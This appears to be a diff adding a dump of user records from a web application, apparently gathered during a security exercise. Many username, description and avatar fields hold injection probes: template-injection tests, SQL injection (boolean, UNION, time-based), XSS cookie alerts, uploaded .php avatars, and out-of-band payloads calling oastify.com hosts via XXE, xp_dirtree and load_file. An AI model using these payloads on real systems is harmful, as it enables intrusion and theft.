+{"id":107,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 108
+{"id":108,"fullName":"khai khai","username":"khai","email":"bgvbvc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752530603.php","birthdate":null,"gender":"Male","company":null}
+
+ID = 109
+{"id":109,"fullName":"uit ussh","username":"ussh","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 110
+{"id":110,"fullName":"khanh Nguyen","username":"khanh","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 111
+{"id":111,"fullName":"123 123","username":"123123123","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 112
+{"id":112,"fullName":"adad adada","username":"{{7*7}}","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 113
+{"id":113,"fullName":"Tri Le","username":"guest'","email":"bgvbvc@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 114
+{"id":114,"fullName":"Mạnh Nguyễn","username":"ManhNguyen","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 115
+{"id":115,"fullName":"huy asd","username":"huy1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 116
+{"id":116,"fullName":"A B","username":"C","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 117
+{"id":117,"fullName":"hy hehe","username":"hyhyhyhehe","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 118
+{"id":118,"fullName":"a a","username":"hoang","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 119
+{"id":119,"fullName":"test test","username":"ndk","email":"test1234@example.com","description":"New user'--","avatar":"/uploads/user_undefined_1760752476254.php","birthdate":null,"gender":"Male","company":"abc'--"}
+
+ID = 120
+{"id":120,"fullName":"bao huu","username":"huubao","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751844530.png","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 121
+{"id":121,"fullName":"aa123 aa","username":"aaa123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 122
+{"id":122,"fullName":"phuc phuc","username":"phuc","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 123
+{"id":123,"fullName":"{{7+7}} {{7+7}}","username":"{{7+7}}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 124
+{"id":124,"fullName":"gadak gadak","username":"gadak","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 125
+{"id":125,"fullName":"123 123","username":"asdasd123","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751520463.jpeg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 126
+{"id":126,"fullName":"uit ussh","username":"usshuit","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 127
+{"id":127,"fullName":"Nguyên Lê Xuân","username":"121","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 128
+{"id":128,"fullName":"Le  Phuc","username":"Phuc","email":"Phuc@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752472257.png","birthdate":null,"gender":null,"company":"ss"}
+
+ID = 129
+{"id":129,"fullName":"te st","username":"test1234","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 130
+{"id":130,"fullName":"{{7*7}} {{7*7}}","username":"test3","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 131
+{"id":131,"fullName":"mi i1","username":"minhi1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 132
+{"id":132,"fullName":"d d","username":"dsa","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 133
+{"id":133,"fullName":"foo bar","username":"bl4ck0ut","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751616440.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 134
+{"id":134,"fullName":"vu vinh","username":"vuxvinh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 135
+{"id":135,"fullName":"test234 test234","username":"test234","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 136
+{"id":136,"fullName":"bruh lmao","username":"carlos1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 137
+{"id":137,"fullName":"Code X","username":"codexuser","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 138
+{"id":138,"fullName":"jason jason","username":"jason","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 139
+{"id":139,"fullName":"a c","username":"qwe","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 140
+{"id":140,"fullName":"a a","username":"phuc123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 141
+{"id":141,"fullName":"minh minh","username":"minh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 142
+{"id":142,"fullName":"afa b","username":"wiener2","email":"test1234@example.com","description":"<SCRIPT>alert(document.cookie);</SCRIPT>","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 143
+{"id":143,"fullName":"sliderboo sliderboo","username":"sliderboo","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 144
+{"id":144,"fullName":"fghfghfhfhfghfh dfgdgdgdgdgfd","username":"dfgdfgf","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 145
+{"id":145,"fullName":"122 122","username":"hehe1337","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 146
+{"id":146,"fullName":"kha ho","username":"kha","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 147
+{"id":147,"fullName":"ad ad","username":"ad","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751685306.svg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 148
+{"id":148,"fullName":"Thu Minh","username":"mihihi","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 149
+{"id":149,"fullName":"' OR '1'='1 ' OR '1'='1","username":"' OR '1'='1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 150
+{"id":150,"fullName":"hnim 26","username":"hnim26","email":"hnim26@example.com","description":"New user - new challenge UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JBbN","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"fppp"}
+
+ID = 151
+{"id":151,"fullName":"abcd2310 abcd2310","username":"abcd2310","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 152
+{"id":152,"fullName":"test fun","username":"tester01","email":"test1234@example.com","description":"{{7*7}}","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":"abc"}
+
+ID = 153
+{"id":153,"fullName":"ahihi alococo","username":"nhat","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 154
+{"id":154,"fullName":"chinh tran","username":"tvc","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 155
+{"id":155,"fullName":"etrhjg etrhjg","username":"etrhjg","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 156
+{"id":156,"fullName":"winky winky","username":"winky","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 157
+{"id":157,"fullName":"pham tien","username":"anhbau1v2","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 158
+{"id":158,"fullName":"kaito vu","username":"kaitovu","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 159
+{"id":159,"fullName":"x x","username":"x","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 160
+{"id":160,"fullName":"abc abc","username":"abcde","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 161
+{"id":161,"fullName":"hgh fghgfh","username":"fghfghfg","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 162
+{"id":162,"fullName":"Duc Minh Khoa Ngo","username":"khavid","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 163
+{"id":163,"fullName":"test12344 test12344","username":"test12344","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 164
+{"id":164,"fullName":"hiền hoàng ","username":"KH2882","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 165
+{"id":165,"fullName":"{{7*7}} {{7*7}}","username":"12123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 166
+{"id":166,"fullName":"test test","username":"PeterPatter","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 167
+{"id":167,"fullName":"admin ad","username":"pat","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 168
+{"id":168,"fullName":"123 123","username":"12a","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 169
+{"id":169,"fullName":"khang khang","username":"khang","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752148739.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 170
+{"id":170,"fullName":"aaaaa aaaaa","username":"aaaaa","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 171
+{"id":171,"fullName":"vu van manh","username":"mawjngvux","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 172
+{"id":172,"fullName":"duy nguyen huu","username":"abc@","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 173
+{"id":173,"fullName":"hihi hihi","username":"hihi","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 174
+{"id":174,"fullName":"ZERO X","username":"Zerox905","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 175
+{"id":175,"fullName":"1 1","username":"baden","email":"","description":"<SCRIPT>\n\nalert(document.cookie);\n\n</SCRIPT>","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 176
+{"id":176,"fullName":"hi hello","username":"owo","email":"bruh@example.com","description":"{{7*7}}","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":null}
+
+ID = 177
+{"id":177,"fullName":"Le Minh","username":"23520928","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 178
+{"id":178,"fullName":"hello vfdv","username":"'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 179
+{"id":179,"fullName":"1 1","username":"HQHHQ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 180
+{"id":180,"fullName":"Hoang Long","username":"Acacia","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 181
+{"id":181,"fullName":"gg gg","username":"gg","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 182
+{"id":182,"fullName":"abc abc","username":"abcdef","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 183
+{"id":183,"fullName":"Võ Nguyên","username":"Neyugn","email":"Neyugn@example.com","description":"</h1> aaa <h1>","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":"Male","company":"FPT"}
+
+ID = 184
+{"id":184,"fullName":"joh ba","username":"hakldgj","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 185
+{"id":185,"fullName":"1 1","username":"HQH","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 186
+{"id":186,"fullName":"dqh dqh","username":"dqh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 187
+{"id":187,"fullName":"kevin ehehe","username":"kevin","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 188
+{"id":188,"fullName":"AbNXJQQb AbNXJQQb","username":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % wflwe SYSTEM \"http://tlie73wnpqa7hci8s6uy5eg3vu1npqdt1lobc0.oasti'||'fy.com/\">%wflwe;]>'),'/l') from dual)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 189
+{"id":189,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % wflwe SYSTEM \"http://srndd22mvpg6nbo7y50xbdm21t7mvpjt7lubi0.oasti'||'fy.com/\">%wflwe;]>'),'/l') from dual)||'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 190
+{"id":190,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb;declare @q varchar(99);set @q='\\\\3fjo1dqxj04hbmcimgo8zoadp4vxj07rxfp2fq4.oasti'+'fy.com\\lxn'; exec master.dbo.xp_dirtree @q;-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 191
+{"id":191,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb';declare @q varchar(99);set @q='\\\\7cksyhn1g41l8q9mjklcws7hm8s1g44vvjn6du2.oasti'+'fy.com\\xmg'; exec master.dbo.xp_dirtree @q;-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 192
+{"id":192,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb);declare @q varchar(99);set @q='\\\\tvseh36nzqk7rcs8264yfeq35ubnzqnhf57sxgm.oasti'+'fy.com\\uzr'; exec master.dbo.xp_dirtree @q;-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 193
+{"id":193,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb');declare @q varchar(99);set @q='\\\\gwg1iq7a0dlusztv3t5lg1rq6hca0do4hs9fz3o.oasti'+'fy.com\\ygs'; exec master.dbo.xp_dirtree @q;-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 194
+{"id":194,"fullName":"AbNXJQQb AbNXJQQb","username":"(select load_file('\\\\\\\\ik636svcof9wg1hxrvtn43fsuj0cofc6eu6hw5l.oastify.com\\\\ldl'))","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 195
+{"id":195,"fullName":"QsFuoYOm QsFuoYOm","username":"QsFuoYOm","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 196
+{"id":196,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'+(select load_file('\\\\\\\\0rslda2uvxgenjofyd05blma117uvxjomcez4nt.oastify.com\\\\qdn'))+'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 197
+{"id":197,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 198
+{"id":198,"fullName":"AbNXJQQb AbNXJQQb","username":"(select*from(select(sleep(20)))a)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 199
+{"id":199,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'(select*from(select(sleep(20)))a)'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 200
+{"id":200,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb+(select*from(select(sleep(20)))a)+","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 201
+{"id":201,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb'+(select*from(select(sleep(20)))a)+'","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 202
+{"id":202,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb and (select*from(select(sleep(20)))a)-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 203
+{"id":203,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' and (select*from(select(sleep(20)))a)-- ","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 204
+{"id":204,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,(select*from(select(sleep(20)))a)","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 205
+{"id":205,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 206
+{"id":206,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb' waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 207
+{"id":207,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb)waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 208
+{"id":208,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb')waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 209
+{"id":209,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb,0)waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 210
+{"id":210,"fullName":"AbNXJQQb AbNXJQQb","username":"AbNXJQQb',0)waitfor delay'0:0:20'--","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 211
